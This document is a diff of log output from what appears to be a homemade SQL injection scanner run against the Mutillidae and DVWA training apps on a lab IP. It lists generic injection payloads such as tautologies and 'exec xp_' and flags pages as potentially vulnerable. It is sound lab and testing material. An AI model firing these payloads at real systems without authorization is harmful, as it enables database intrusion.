@@ -1,276 +1,98 @@
-2024-04-10 15:10:50,292 - INFO - 
+2024-04-11 02:03:19,387 - INFO - 
 Starting ScanSQLInject scan
-2024-04-10 15:10:50,292 - INFO - 
-Starting ScanSQLInject scan
-2024-04-10 15:10:50,301 - INFO - No forms found on http://192.168.232.129:80/. Skipping...
-2024-04-10 15:10:50,301 - INFO - No forms found on http://192.168.232.129:80/. Skipping...
-2024-04-10 15:10:50,340 - INFO - No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
-2024-04-10 15:10:50,340 - INFO - No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
-2024-04-10 15:10:50,377 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
-2024-04-10 15:10:50,377 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
-2024-04-10 15:10:50,415 - INFO - Testing payload: 1'1
+2024-04-11 02:03:19,396 - INFO - No forms found on http://192.168.232.129:80/. Skipping...
+2024-04-11 02:03:19,434 - INFO - No forms found on http://192.168.232.129:80/mutillidae/. Skipping...
+2024-04-11 02:03:19,472 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=home.php. Skipping...
+2024-04-11 02:03:19,512 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/index.php?page=login.php
-2024-04-10 15:10:50,415 - INFO - Testing payload: 1'1
+2024-04-11 02:03:19,539 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
+
+2024-04-11 02:03:19,539 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/index.php?page=login.php
-2024-04-10 15:10:50,442 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
+2024-04-11 02:03:19,539 - INFO - Modified URL: http://192.168.232.129:80/mutillidae/index.php?page=1%271%0A
+2024-04-11 02:03:19,566 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
 
-2024-04-10 15:10:50,442 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
-
-2024-04-10 15:10:50,442 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=login.php
-2024-04-10 15:10:50,442 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=login.php
-2024-04-10 15:10:50,469 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
-
-2024-04-10 15:10:50,469 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=login.php with payload 1'1
-
-2024-04-10 15:10:50,487 - INFO - Testing payload: 1'1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,487 - INFO - Testing payload: 1'1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,503 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,503 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,521 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,521 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,539 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,539 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,556 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,556 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,573 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,573 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,591 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,591 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,609 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,609 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,627 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,627 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,645 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,645 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/dvwa/vulnerabilities/xss_r/
-2024-04-10 15:10:50,663 - INFO - Testing payload: 1'1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,663 - INFO - Testing payload: 1'1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,681 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,681 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,698 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,698 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,715 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,715 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,732 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,732 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,749 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,749 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,766 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,766 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,782 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,782 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,799 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,799 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,815 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,815 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/dvwa/vulnerabilities/xss_s/
-2024-04-10 15:10:50,851 - INFO - Testing payload: 1'1
+2024-04-11 02:03:19,604 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
-2024-04-10 15:10:50,851 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=user-info.php
-2024-04-10 15:10:50,878 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php with payload 1'1
+2024-04-11 02:03:19,630 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php with payload 1'1
 
-2024-04-10 15:10:50,878 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=user-info.php with payload 1'1
-
-2024-04-10 15:10:50,916 - INFO - Testing payload: 1'1
+2024-04-11 02:03:19,670 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/index.php?page=register.php
-2024-04-10 15:10:50,916 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=register.php
-2024-04-10 15:10:50,943 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php with payload 1'1
+2024-04-11 02:03:19,698 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php with payload 1'1
 
-2024-04-10 15:10:50,943 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=register.php with payload 1'1
-
-2024-04-10 15:10:50,981 - INFO - Testing payload: 1'1
+2024-04-11 02:03:19,734 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
-2024-04-10 15:10:50,981 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php
-2024-04-10 15:10:51,011 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php with payload 1'1
+2024-04-11 02:03:19,774 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php with payload 1'1
 
-2024-04-10 15:10:51,011 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=dns-lookup.php with payload 1'1
+2024-04-11 02:03:19,816 - INFO - Testing payload: 1'1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,844 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,871 - INFO - Testing payload: 1 and 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,899 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,928 - INFO - Testing payload: 1 or 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,956 - INFO - Testing payload: 1' or '1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:19,984 - INFO - Testing payload: 1or1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:20,013 - INFO - Testing payload: 1'or'1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:20,040 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
+ on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:20,067 - INFO - No SQL injection form vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
+2024-04-11 02:03:20,105 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
+2024-04-11 02:03:20,141 - INFO - Testing payload: 1'1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,168 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,195 - INFO - Testing payload: 1 and 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,221 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,248 - INFO - Testing payload: 1 or 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,275 - INFO - Testing payload: 1' or '1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,304 - INFO - Testing payload: 1or1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,332 - INFO - Testing payload: 1'or'1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,359 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
+ on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,387 - INFO - No SQL injection form vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
+2024-04-11 02:03:20,426 - INFO - Testing payload: 1'1
+ on http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php
+2024-04-11 02:03:20,454 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=set-background-color.php with payload 1'1
 
-2024-04-10 15:10:51,055 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,055 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,083 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,083 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,112 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,112 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,141 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,141 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,169 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,169 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,197 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,197 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,225 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,225 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,253 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,253 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,284 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,284 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,314 - INFO - No SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,314 - INFO - No SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=view-someones-blog.php
-2024-04-10 15:10:51,359 - INFO - Testing payload: 1'1
+2024-04-11 02:03:20,500 - INFO - Testing payload: 1'1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,528 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,556 - INFO - Testing payload: 1 and 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,583 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,611 - INFO - Testing payload: 1 or 1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,638 - INFO - Testing payload: 1' or '1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,666 - INFO - Testing payload: 1or1=1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,694 - INFO - Testing payload: 1'or'1'='1
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,722 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
+ on http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,749 - INFO - No SQL injection form vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=html5-storage.php
+2024-04-11 02:03:20,790 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
-2024-04-10 15:10:51,359 - INFO - Testing payload: 1'1
+2024-04-11 02:03:20,818 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
+
+2024-04-11 02:03:20,818 - INFO - Testing payload: 1'1
  on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
-2024-04-10 15:10:51,393 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
+2024-04-11 02:03:20,818 - INFO - Modified URL: http://192.168.232.129:80/mutillidae/?page=1%271%0A
+2024-04-11 02:03:20,844 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
 
-2024-04-10 15:10:51,393 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
-
-2024-04-10 15:10:51,393 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
-2024-04-10 15:10:51,393 - INFO - Testing payload: 1'1
- on http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php
-2024-04-10 15:10:51,421 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
-
-2024-04-10 15:10:51,421 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=add-to-your-blog.php with payload 1'1
-
-2024-04-10 15:10:51,459 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
-2024-04-10 15:10:51,459 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=arbitrary-file-inclusion.php. Skipping...
-2024-04-10 15:10:51,508 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,508 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,537 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,537 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,566 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,566 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,598 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,598 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,633 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,633 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,665 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,665 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,694 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,694 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,723 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,723 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,753 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,753 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,780 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,780 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,781 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,781 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php
-2024-04-10 15:10:51,807 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php with payload 1'1
-
-2024-04-10 15:10:51,807 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=text-file-viewer.php with payload 1'1
-
-2024-04-10 15:10:51,844 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=set-background-color.php
-2024-04-10 15:10:51,844 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=set-background-color.php
-2024-04-10 15:10:51,872 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=set-background-color.php with payload 1'1
-
-2024-04-10 15:10:51,872 - WARNING - Potential SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=set-background-color.php with payload 1'1
-
-2024-04-10 15:10:51,911 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,911 - INFO - Testing payload: 1'1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,939 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,939 - INFO - Testing payload: 1 exec sp_ (or exec xp_)
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,967 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,967 - INFO - Testing payload: 1 and 1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,996 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:51,996 - INFO - Testing payload: 1' and 1=(select count(*) from tablenames); --
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,024 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,024 - INFO - Testing payload: 1 or 1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,053 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,053 - INFO - Testing payload: 1' or '1'='1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,082 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,082 - INFO - Testing payload: 1or1=1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,112 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,112 - INFO - Testing payload: 1'or'1'='1
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,143 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,143 - INFO - Testing payload: fake@ema'or'il.nl'='il.nl
- on http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,170 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,170 - INFO - No SQL injection vulnerability found at: http://192.168.232.129/mutillidae/index.php?page=html5-storage.php
-2024-04-10 15:10:52,209 - INFO - No forms found on http://192.168.232.129/mutillidae/index.php?page=capture-data.php. Skipping...
-2024-04-10 15:10:52,209 - INFO - No forms found on http://192.168.232.129/mutillidae/index.php?page=capture-data.php. Skipping...
+2024-04-11 02:03:20,884 - INFO - No forms found on http://192.168.232.129:80/mutillidae/index.php?page=capture-data.php. Skipping...
